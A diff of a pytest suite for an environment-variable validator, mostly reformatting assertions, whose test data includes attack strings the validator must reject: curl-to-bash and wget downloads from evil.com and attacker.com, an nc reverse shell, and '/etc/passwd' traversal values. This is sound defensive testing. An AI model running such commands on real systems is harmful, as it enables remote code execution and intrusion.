@@ -18,6 +18,7 @@ Reference:
 - OWASP Top 10 2021
 - CWE-77 (Command Injection), CWE-22 (Path Traversal), CWE-89 (SQL Injection)
 """
+
 import os
 
 import pytest
@@ -27,6 +28,7 @@ from temper_ai.workflow.env_var_validator import EnvVarValidator, ValidationLeve
 # ============================================================================
 # Test Class 1: EXECUTABLE Level (Command Injection Prevention)
 # ============================================================================
+
 
 class TestEnvVarValidatorExecutableLevel:
     """Test EXECUTABLE validation level (most restrictive - command injection prevention)."""
@@ -71,7 +73,9 @@ class TestEnvVarValidatorExecutableLevel:
 
         for var_name, attack_value, desc in attack_vectors:
             is_valid, error = validator.validate(var_name, attack_value)
-            assert not is_valid, f"{desc} attack should be blocked: {var_name}={attack_value}"
+            assert (
+                not is_valid
+            ), f"{desc} attack should be blocked: {var_name}={attack_value}"
             assert error is not None, f"Error message should be provided for: {desc}"
 
     def test_command_injection_real_world_attacks(self):
@@ -79,7 +83,7 @@ class TestEnvVarValidatorExecutableLevel:
         validator = EnvVarValidator()
 
         real_attacks = [
-            ("CMD", "/bin/bash -c \"curl http://evil.com/shell.sh | bash\""),
+            ("CMD", '/bin/bash -c "curl http://evil.com/shell.sh | bash"'),
             ("EXEC", "/usr/bin/wget http://attacker.com/backdoor -O /tmp/bd"),
             ("SHELL", "/bin/nc -e /bin/bash attacker.com 4444"),
             ("RUN", "/bin/python3 -c 'import os; os.system(\"evil\")'"),
@@ -88,12 +92,15 @@ class TestEnvVarValidatorExecutableLevel:
 
         for var_name, attack in real_attacks:
             is_valid, error = validator.validate(var_name, attack)
-            assert not is_valid, f"Real-world attack should be blocked: {attack[:50]}..."
+            assert (
+                not is_valid
+            ), f"Real-world attack should be blocked: {attack[:50]}..."
 
 
 # ============================================================================
 # Test Class 2: PATH Level (Path Traversal Prevention)
 # ============================================================================
+
 
 class TestEnvVarValidatorPathLevel:
     """Test PATH validation level (path traversal prevention)."""
@@ -128,8 +135,12 @@ class TestEnvVarValidatorPathLevel:
 
         for var_name, attack_value in attack_vectors:
             is_valid, error = validator.validate(var_name, attack_value)
-            assert not is_valid, f"Path traversal should be blocked: {var_name}={attack_value}"
-            assert ("traversal" in error.lower() or "escapes" in error.lower()), f"Error should mention traversal or escaping: {error}"
+            assert (
+                not is_valid
+            ), f"Path traversal should be blocked: {var_name}={attack_value}"
+            assert (
+                "traversal" in error.lower() or "escapes" in error.lower()
+            ), f"Error should mention traversal or escaping: {error}"
 
     def test_path_traversal_windows_blocked(self):
         """Windows-style path traversal must be blocked."""
@@ -143,7 +154,9 @@ class TestEnvVarValidatorPathLevel:
 
         for var_name, attack_value in attack_vectors:
             is_valid, error = validator.validate(var_name, attack_value)
-            assert not is_valid, f"Windows path traversal should be blocked: {var_name}={attack_value}"
+            assert (
+                not is_valid
+            ), f"Windows path traversal should be blocked: {var_name}={attack_value}"
 
     def test_absolute_paths_blocked_with_validation_level(self):
         """Absolute paths with shell characters should be blocked in PATH context."""
@@ -157,12 +170,15 @@ class TestEnvVarValidatorPathLevel:
 
         for var_name, attack_value in attack_vectors:
             is_valid, error = validator.validate(var_name, attack_value)
-            assert not is_valid, f"Path with shell chars should be blocked: {var_name}={attack_value}"
+            assert (
+                not is_valid
+            ), f"Path with shell chars should be blocked: {var_name}={attack_value}"
 
 
 # ============================================================================
 # Test Class 3: IDENTIFIER Level (SQL Injection Prevention)
 # ============================================================================
+
 
 class TestEnvVarValidatorIdentifierLevel:
     """Test IDENTIFIER validation level (SQL injection prevention)."""
@@ -212,7 +228,9 @@ class TestEnvVarValidatorIdentifierLevel:
 
         for var_name, attack_value in attack_vectors:
             is_valid, error = validator.validate(var_name, attack_value)
-            assert not is_valid, f"UNION attack should be blocked: {var_name}={attack_value}"
+            assert (
+                not is_valid
+            ), f"UNION attack should be blocked: {var_name}={attack_value}"
 
     def test_sql_injection_comment_obfuscation(self):
         """SQL comment obfuscation techniques must be blocked."""
@@ -225,12 +243,15 @@ class TestEnvVarValidatorIdentifierLevel:
 
         for var_name, attack_value in attack_vectors:
             is_valid, error = validator.validate(var_name, attack_value)
-            assert not is_valid, f"Comment obfuscation should be blocked: {var_name}={attack_value}"
+            assert (
+                not is_valid
+            ), f"Comment obfuscation should be blocked: {var_name}={attack_value}"
 
 
 # ============================================================================
 # Test Class 4: Context Detection
 # ============================================================================
+
 
 class TestEnvVarValidatorContextDetection:
     """Test automatic context detection from variable names."""
@@ -240,56 +261,79 @@ class TestEnvVarValidatorContextDetection:
         validator = EnvVarValidator()
 
         executable_vars = [
-            "SHELL_CMD", "PYTHON_CMD", "COMMAND", "EXEC_PATH",
-            "RUN_SCRIPT", "BINARY", "EXECUTABLE", "PROGRAM_RUN"
+            "SHELL_CMD",
+            "PYTHON_CMD",
+            "COMMAND",
+            "EXEC_PATH",
+            "RUN_SCRIPT",
+            "BINARY",
+            "EXECUTABLE",
+            "PROGRAM_RUN",
         ]
 
         for var_name in executable_vars:
             context = validator.detect_context(var_name)
-            assert context == ValidationLevel.EXECUTABLE, \
-                f"{var_name} should be detected as EXECUTABLE, got {context}"
+            assert (
+                context == ValidationLevel.EXECUTABLE
+            ), f"{var_name} should be detected as EXECUTABLE, got {context}"
 
     def test_detect_path_context(self):
         """Variables with PATH/DIR/FILE should be detected as PATH."""
         validator = EnvVarValidator()
 
         path_vars = [
-            "DATA_PATH", "CONFIG_DIR", "FILE_PATH", "LOG_DIRECTORY",
-            "TEMP_FOLDER", "OUTPUT_DIR", "HOME_PATH"
+            "DATA_PATH",
+            "CONFIG_DIR",
+            "FILE_PATH",
+            "LOG_DIRECTORY",
+            "TEMP_FOLDER",
+            "OUTPUT_DIR",
+            "HOME_PATH",
         ]
 
         for var_name in path_vars:
             context = validator.detect_context(var_name)
-            assert context == ValidationLevel.PATH, \
-                f"{var_name} should be detected as PATH, got {context}"
+            assert (
+                context == ValidationLevel.PATH
+            ), f"{var_name} should be detected as PATH, got {context}"
 
     def test_detect_identifier_context(self):
         """Variables with DB/TABLE/MODEL should be detected as IDENTIFIER."""
         validator = EnvVarValidator()
 
         identifier_vars = [
-            "DB_NAME", "TABLE_NAME", "MODEL_NAME", "SCHEMA_NAME",
-            "DATABASE", "COLLECTION_NAME", "PROVIDER_NAME"
+            "DB_NAME",
+            "TABLE_NAME",
+            "MODEL_NAME",
+            "SCHEMA_NAME",
+            "DATABASE",
+            "COLLECTION_NAME",
+            "PROVIDER_NAME",
         ]
 
         for var_name in identifier_vars:
             context = validator.detect_context(var_name)
-            assert context == ValidationLevel.IDENTIFIER, \
-                f"{var_name} should be detected as IDENTIFIER, got {context}"
+            assert (
+                context == ValidationLevel.IDENTIFIER
+            ), f"{var_name} should be detected as IDENTIFIER, got {context}"
 
     def test_detect_unrestricted_context(self):
         """Variables with PROMPT/DESCRIPTION/MESSAGE should be detected as UNRESTRICTED."""
         validator = EnvVarValidator()
 
         unrestricted_vars = [
-            "PROMPT_TEXT", "DESCRIPTION", "MESSAGE_CONTENT",
-            "TEMPLATE_TEXT", "CONTENT_TEXT"
+            "PROMPT_TEXT",
+            "DESCRIPTION",
+            "MESSAGE_CONTENT",
+            "TEMPLATE_TEXT",
+            "CONTENT_TEXT",
         ]
 
         for var_name in unrestricted_vars:
             context = validator.detect_context(var_name)
-            assert context == ValidationLevel.UNRESTRICTED, \
-                f"{var_name} should be detected as UNRESTRICTED, got {context}"
+            assert (
+                context == ValidationLevel.UNRESTRICTED
+            ), f"{var_name} should be detected as UNRESTRICTED, got {context}"
 
     def test_context_priority_unrestricted_first(self):
         """UNRESTRICTED patterns should match first to avoid false positives."""
@@ -297,8 +341,9 @@ class TestEnvVarValidatorContextDetection:
 
         # "DESCRIPTION" contains "script" but should be UNRESTRICTED
         context = validator.detect_context("JOB_DESCRIPTION")
-        assert context == ValidationLevel.UNRESTRICTED, \
-            "JOB_DESCRIPTION should be UNRESTRICTED (contains 'description'), not EXECUTABLE"
+        assert (
+            context == ValidationLevel.UNRESTRICTED
+        ), "JOB_DESCRIPTION should be UNRESTRICTED (contains 'description'), not EXECUTABLE"
 
     def test_default_context_for_unknown(self):
         """Unknown variable names should default to DATA level."""
@@ -308,13 +353,15 @@ class TestEnvVarValidatorContextDetection:
 
         for var_name in unknown_vars:
             context = validator.detect_context(var_name)
-            assert context == ValidationLevel.DATA, \
-                f"{var_name} should default to DATA, got {context}"
+            assert (
+                context == ValidationLevel.DATA
+            ), f"{var_name} should default to DATA, got {context}"
 
 
 # ============================================================================
 # Test Class 5: Edge Cases and Boundary Conditions
 # ============================================================================
+
 
 class TestEnvVarValidatorEdgeCases:
     """Test edge cases and boundary conditions."""
@@ -324,7 +371,9 @@ class TestEnvVarValidatorEdgeCases:
         validator = EnvVarValidator()
 
         # Test across different contexts
-        is_valid, error = validator.validate("TEST_VAR", "", context=ValidationLevel.DATA)
+        is_valid, error = validator.validate(
+            "TEST_VAR", "", context=ValidationLevel.DATA
+        )
         # Empty string might be valid or invalid depending on implementation
         # Just verify it doesn't crash
         assert isinstance(is_valid, bool)
@@ -334,7 +383,9 @@ class TestEnvVarValidatorEdgeCases:
         validator = EnvVarValidator()
 
         long_string = "A" * 100000  # 100KB
-        is_valid, error = validator.validate("TEST_VAR", long_string, context=ValidationLevel.DATA)
+        is_valid, error = validator.validate(
+            "TEST_VAR", long_string, context=ValidationLevel.DATA
+        )
 
         assert not is_valid, "Very long string should be rejected (DoS prevention)"
         assert "too long" in error.lower(), f"Error should mention length: {error}"
@@ -345,10 +396,7 @@ class TestEnvVarValidatorEdgeCases:
 
         short_limit = "A" * 100
         is_valid, error = validator.validate(
-            "TEST_VAR",
-            short_limit,
-            context=ValidationLevel.DATA,
-            max_length=50
+            "TEST_VAR", short_limit, context=ValidationLevel.DATA, max_length=50
         )
 
         assert not is_valid, "String exceeding custom max_length should be rejected"
@@ -368,8 +416,12 @@ class TestEnvVarValidatorEdgeCases:
         attack_value = "valid\x00/etc/passwd"
 
         for context in contexts:
-            is_valid, error = validator.validate("TEST_VAR", attack_value, context=context)
-            assert not is_valid, f"Null byte should be blocked in {context.value} context"
+            is_valid, error = validator.validate(
+                "TEST_VAR", attack_value, context=context
+            )
+            assert (
+                not is_valid
+            ), f"Null byte should be blocked in {context.value} context"
             assert "null" in error.lower(), f"Error should mention null byte: {error}"
 
     def test_unicode_in_unrestricted_context(self):
@@ -386,7 +438,9 @@ class TestEnvVarValidatorEdgeCases:
 
         for var_name, value in unicode_values:
             is_valid, error = validator.validate(var_name, value)
-            assert is_valid, f"Unicode (BMP) should be valid in UNRESTRICTED: {var_name}={value}. Error: {error}"
+            assert (
+                is_valid
+            ), f"Unicode (BMP) should be valid in UNRESTRICTED: {var_name}={value}. Error: {error}"
 
     def test_whitespace_handling(self):
         """Whitespace in values should be handled correctly."""
@@ -414,13 +468,15 @@ class TestEnvVarValidatorEdgeCases:
 
         for var_name, expected_context in mixed_case_vars:
             detected = validator.detect_context(var_name)
-            assert detected == expected_context, \
-                f"{var_name} should detect as {expected_context}, got {detected}"
+            assert (
+                detected == expected_context
+            ), f"{var_name} should detect as {expected_context}, got {detected}"
 
 
 # ============================================================================
 # Test Class 6: STRUCTURED Level (URLs, Connection Strings)
 # ============================================================================
+
 
 class TestEnvVarValidatorStructuredLevel:
     """Test STRUCTURED validation level (URLs, connection strings)."""
@@ -452,12 +508,15 @@ class TestEnvVarValidatorStructuredLevel:
 
         for var_name, attack_value in attack_vectors:
             is_valid, error = validator.validate(var_name, attack_value)
-            assert not is_valid, f"URL with shell chars should be blocked: {var_name}={attack_value}"
+            assert (
+                not is_valid
+            ), f"URL with shell chars should be blocked: {var_name}={attack_value}"
 
 
 # ============================================================================
 # Test Class 7: DATA Level (API Keys, Tokens)
 # ============================================================================
+
 
 class TestEnvVarValidatorDataLevel:
     """Test DATA validation level (API keys, tokens, credentials)."""
@@ -489,12 +548,15 @@ class TestEnvVarValidatorDataLevel:
 
         for var_name, attack_value in attack_vectors:
             is_valid, error = validator.validate(var_name, attack_value)
-            assert not is_valid, f"Credential with shell chars should be blocked: {var_name}={attack_value}"
+            assert (
+                not is_valid
+            ), f"Credential with shell chars should be blocked: {var_name}={attack_value}"
 
 
 # ============================================================================
 # Test Class 8: Error Messages
 # ============================================================================
+
 
 class TestEnvVarValidatorErrorMessages:
     """Test error message quality and security."""
@@ -533,12 +595,15 @@ class TestEnvVarValidatorErrorMessages:
 
         is_valid, error = validator.validate("DATA_PATH", "../../../etc/passwd")
         assert not is_valid
-        assert ("traversal" in error.lower() or "escapes" in error.lower()), f"Error should mention path traversal or escaping: {error}"
+        assert (
+            "traversal" in error.lower() or "escapes" in error.lower()
+        ), f"Error should mention path traversal or escaping: {error}"
 
 
 # ============================================================================
 # Test Class 9: Performance and DoS Resistance
 # ============================================================================
+
 
 class TestEnvVarValidatorPerformance:
     """Test performance and DoS resistance."""
@@ -546,6 +611,7 @@ class TestEnvVarValidatorPerformance:
     def test_validation_completes_quickly(self):
         """Validation should complete quickly even for complex patterns."""
         import time
+
         validator = EnvVarValidator()
 
         start = time.perf_counter()
@@ -559,6 +625,7 @@ class TestEnvVarValidatorPerformance:
     def test_regex_no_catastrophic_backtracking(self):
         """Validation regex should not have catastrophic backtracking."""
         import time
+
         validator = EnvVarValidator()
 
         # Pathological input that could cause catastrophic backtracking
@@ -569,7 +636,9 @@ class TestEnvVarValidatorPerformance:
         elapsed = time.perf_counter() - start
 
         # Should complete quickly (<0.1s) even with pathological input
-        assert elapsed < 0.1, f"Pathological input took {elapsed:.2f}s (potential backtracking)"
+        assert (
+            elapsed < 0.1
+        ), f"Pathological input took {elapsed:.2f}s (potential backtracking)"
 
 
 class TestWindowsPathTraversal:
@@ -589,10 +658,12 @@ class TestWindowsPathTraversal:
 
         for var_name, attack_value in attack_vectors:
             is_valid, error = validator.validate(var_name, attack_value)
-            assert not is_valid, f"Complex Windows traversal should be blocked: {var_name}={attack_value}"
+            assert (
+                not is_valid
+            ), f"Complex Windows traversal should be blocked: {var_name}={attack_value}"
             assert error is not None, "Error message should be provided"
 
-    @pytest.mark.skipif(os.name != 'nt', reason="Windows-specific test")
+    @pytest.mark.skipif(os.name != "nt", reason="Windows-specific test")
     def test_windows_unc_path_detection(self):
         """Test UNC path detection on Windows."""
         validator = EnvVarValidator()
@@ -608,7 +679,7 @@ class TestWindowsPathTraversal:
             # UNC paths are blocked by pattern validation (contains \\)
             assert not is_valid, f"UNC path should be blocked: {path}"
 
-    @pytest.mark.skipif(os.name != 'nt', reason="Windows-specific test")
+    @pytest.mark.skipif(os.name != "nt", reason="Windows-specific test")
     def test_windows_drive_letter_traversal(self):
         """Test drive letter changes are handled correctly."""
         validator = EnvVarValidator()
@@ -636,7 +707,9 @@ class TestWindowsPathTraversal:
 
         for var_name, attack_value in attack_vectors:
             is_valid, error = validator.validate(var_name, attack_value)
-            assert not is_valid, f"Mixed separator traversal should be blocked: {var_name}={attack_value}"
+            assert (
+                not is_valid
+            ), f"Mixed separator traversal should be blocked: {var_name}={attack_value}"
 
     def test_normalized_paths_are_safe(self):
         """Test that safe normalized paths are allowed."""
@@ -651,7 +724,9 @@ class TestWindowsPathTraversal:
 
         for var_name, safe_value in safe_paths:
             is_valid, error = validator.validate(var_name, safe_value)
-            assert is_valid, f"Safe path should be allowed: {var_name}={safe_value}, error: {error}"
+            assert (
+                is_valid
+            ), f"Safe path should be allowed: {var_name}={safe_value}, error: {error}"
 
     def test_path_with_dots_but_safe(self):
         """Test paths containing dots in filenames are allowed."""
@@ -665,7 +740,9 @@ class TestWindowsPathTraversal:
 
         for var_name, safe_value in safe_paths:
             is_valid, error = validator.validate(var_name, safe_value)
-            assert is_valid, f"Safe path with dots should be allowed: {var_name}={safe_value}, error: {error}"
+            assert (
+                is_valid
+            ), f"Safe path with dots should be allowed: {var_name}={safe_value}, error: {error}"
 
     def test_path_starting_with_dot_blocked(self):
         """Test paths starting with .. are blocked."""
@@ -680,7 +757,9 @@ class TestWindowsPathTraversal:
 
         for var_name, attack_value in attack_vectors:
             is_valid, error = validator.validate(var_name, attack_value)
-            assert not is_valid, f"Path starting with .. should be blocked: {var_name}={attack_value}"
+            assert (
+                not is_valid
+            ), f"Path starting with .. should be blocked: {var_name}={attack_value}"
 
     def test_deeply_nested_traversal_blocked(self):
         """Test deeply nested path traversal is blocked."""
@@ -703,7 +782,9 @@ class TestWindowsPathTraversal:
         # Unix absolute paths
         is_valid, error = validator.validate("DATA_PATH", "/etc/passwd")
         assert not is_valid, "Absolute Unix path should be rejected"
-        assert "escapes base" in error.lower(), f"Error should mention escaping: {error}"
+        assert (
+            "escapes base" in error.lower()
+        ), f"Error should mention escaping: {error}"
 
         # Windows absolute paths
         is_valid, error = validator.validate("CONFIG_DIR", "C:\\Windows\\System32")
@@ -722,11 +803,14 @@ class TestWindowsPathTraversal:
 
         for path in windows_paths:
             is_valid, error = validator.validate("DATA_PATH", path)
-            assert is_valid, f"Windows-style path should be valid: {path}, error: {error}"
+            assert (
+                is_valid
+            ), f"Windows-style path should be valid: {path}, error: {error}"
 
     def test_base_directory_containment(self):
         """Test paths are properly validated against base directory."""
         import tempfile
+
         validator = EnvVarValidator()
 
         # Create temp directory for testing
@@ -738,12 +822,16 @@ class TestWindowsPathTraversal:
             try:
                 # Should allow - relative path within base
                 is_valid, error = validator.validate("DATA_PATH", "data/config.yml")
-                assert is_valid, f"Relative path within base should be allowed, error: {error}"
+                assert (
+                    is_valid
+                ), f"Relative path within base should be allowed, error: {error}"
 
                 # Should block - tries to escape
                 is_valid, error = validator.validate("DATA_PATH", "../etc/passwd")
                 assert not is_valid, "Path escaping base should be blocked"
-                assert "escapes" in error.lower(), f"Error should mention escaping: {error}"
+                assert (
+                    "escapes" in error.lower()
+                ), f"Error should mention escaping: {error}"
 
             finally:
                 # Restore original getcwd
